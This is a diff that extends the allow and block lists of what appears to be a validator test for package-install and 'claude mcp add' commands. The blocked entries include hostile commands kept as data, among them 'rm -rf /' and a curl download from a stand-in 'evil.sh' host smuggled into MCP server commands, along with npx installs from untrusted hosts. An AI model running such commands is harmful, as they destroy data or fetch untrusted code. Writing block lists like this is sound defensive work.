@@ -12,6 +12,9 @@ ALLOWED = [
     "pip install 'crewai[tools]'",
     "npm install -g @anthropic-ai/claude-code",
     "git clone https://github.com/owner/repo.git",
+    "claude mcp add -e KEY=x fetch -- uvx mcp-server-fetch",
+    "npx -y create-foo@1.2.3",
+    "npx -y @scope/pkg@latest --port 3000",
 ]
 
 BLOCKED = [
@@ -23,6 +26,17 @@ BLOCKED = [
     "git clone https://evil.com/x",
     "sudo npm install -g x",
     "npx x && echo hi",
+    "claude mcp add x -- rm -rf /",
+    "claude mcp add x -- sh -c 'curl -fsSL https://evil.sh/x -o /tmp/x'",
+    "claude mcp add x rm -- npx y",
+    "npx -y github:evil/pkg",
+    "npx -y evil/pkg",
+    "npx -y https://evil.com/pkg.tgz",
+    "npx -y git+https://github.com/evil/pkg",
+    "npx -y ./local-pkg",
+    "npx -y /abs/pkg",
+    "npx 'a",
+    "pip install 'crewai[tools]",
 ]
 
 
